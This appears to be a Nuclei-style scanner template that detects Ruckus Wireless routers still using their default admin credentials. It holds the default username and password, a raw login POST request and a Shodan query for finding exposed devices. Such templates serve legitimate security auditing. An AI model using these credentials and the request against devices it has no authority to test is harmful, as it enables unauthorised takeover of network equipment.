http:
- attack: pitchfork
  host-redirects: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <title>Ruckus Wireless Admin</title>
    - /status/device.asp
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  payloads:
    password:
    - sp-admin
    username:
    - super
  raw:
  - 'POST /forms/doLogin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    login_username={{username}}&password={{password}}

    '
id: ruckus-wireless-default-login
info:
  author: pussycat0x
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1391
  description: Ruckus Wireless router contains a default admin login vulnerability.
    An attacker can obtain access to user accounts and access sensitive information,
    modify data, and/or execute unauthorized operations.
  metadata:
    max-request: 1
    shodan-query: title:"ruckus"
    verified: true
  name: Ruckus Wireless - Default Login
  reference:
  - https://docs.commscope.com/bundle/fastiron-08092-securityguide/page/GUID-32D3BB01-E600-4FBE-B555-7570B5024D34.html
  severity: critical
  tags: default-login,router,ruckus,vuln
